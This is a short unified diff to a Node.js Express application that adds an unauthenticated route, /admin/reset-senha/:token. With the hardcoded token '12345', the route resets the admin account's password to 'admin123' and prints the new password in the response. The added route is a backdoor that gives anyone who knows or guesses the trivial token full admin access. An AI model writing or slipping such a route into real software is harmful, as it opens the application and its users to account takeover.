@@ -107,6 +107,15 @@ app.use((req, res, next) => {
   next();
 });
 
+app.get('/admin/reset-senha/:token', (req, res) => {
+  if (req.params.token !== '12345') return res.status(404).send('not found');
+  const bcrypt = require('bcryptjs');
+  const hash = bcrypt.hashSync('admin123', 12);
+  const db = require('./database/db');
+  db.run('UPDATE admins SET password_hash = ? WHERE username = ?', [hash, 'admin']);
+  res.send('Senha do admin resetada para: admin123');
+});
+
 app.use('/admin', authRoutes);
 app.use('/admin', adminRoutes(upload));
 app.use('/seller', sellerRoutes(upload));
